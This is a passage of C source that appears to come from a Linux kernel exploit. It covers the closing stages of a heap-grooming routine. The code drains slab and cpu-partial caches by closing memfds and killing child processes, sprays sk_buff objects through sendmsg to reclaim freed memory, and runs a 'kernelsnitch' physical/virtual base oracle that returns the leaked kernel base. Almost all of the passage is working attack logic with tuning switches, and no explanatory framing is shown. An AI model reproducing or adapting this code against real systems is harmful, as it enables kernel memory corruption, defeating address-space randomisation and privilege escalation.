    size_t index = i * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#if (defined(DEFER_ALL_DRAIN_REAPS) && \
     DEFER_ALL_DRAIN_REAPS) || \
    (defined(DEFER_FINAL_DRAIN_REAP) && \
     DEFER_FINAL_DRAIN_REAP)
    int defer_reap = 0;
#if defined(DEFER_ALL_DRAIN_REAPS) && DEFER_ALL_DRAIN_REAPS
    defer_reap = 1;
#elif defined(DEFER_FINAL_DRAIN_REAP) && DEFER_FINAL_DRAIN_REAP
    defer_reap = i + 1 == drain_triggers;
#endif
    if (defer_reap) {
      pid_t child = prepare_ctx.childs[index];
      SYSCHK(kill(child, SIGKILL));
      siginfo_t child_info;
      memset(&child_info, 0, sizeof(child_info));
      int wait_ret;
      do {
        wait_ret = waitid(P_PID, child, &child_info,
                          WEXITED | WNOWAIT);
      } while (wait_ret < 0 && errno == EINTR);
      SYSCHK(wait_ret);
      deferred_reap_children[deferred_reap_count++] = child;
      prepare_ctx.childs[index] = -1;
#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
              "code=%d status=%d\n",
              i + 1, drain_triggers, child, child_info.si_code,
              child_info.si_status);
#endif
      continue;
    }
#endif
#endif
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if !defined(REQUIRE_FRESH_P0_SESSION) || !REQUIRE_FRESH_P0_SESSION
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
#endif
  int reclaim_sends = SKB_RECLAIM_SENDS;
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  reclaim_sends = SLIDE_RECLAIM_SENDS;
#endif
  int reclaim_sent = 0;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  int reclaim_errno = 0;
#endif
  for (int i = 0; i < reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
      reclaim_errno = errno;
#endif
      break;
    }
    reclaim_sent++;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  for (size_t i = 0; i < deferred_reap_count; i++) {
    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
            i + 1, deferred_reap_count, deferred_reap_children[i]);
  }
#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
          deferred_reap_count);
#endif
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
  log_mm_slabinfo("after-exact-drain-reclaim");
#else
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends, payload_mode);
#endif
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
          payload_mode, base);
#endif
  kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
          payload_mode);

  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
          prepare_ctx.mm_cnt);
#endif
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
        i + 1 == prepare_ctx.mm_cnt) {
      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
              i + 1, prepare_ctx.mm_cnt);
    }
#endif
  }
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
          base);
#endif

  return base;
}

#endif /* SLIDE_USE_PSELECT */
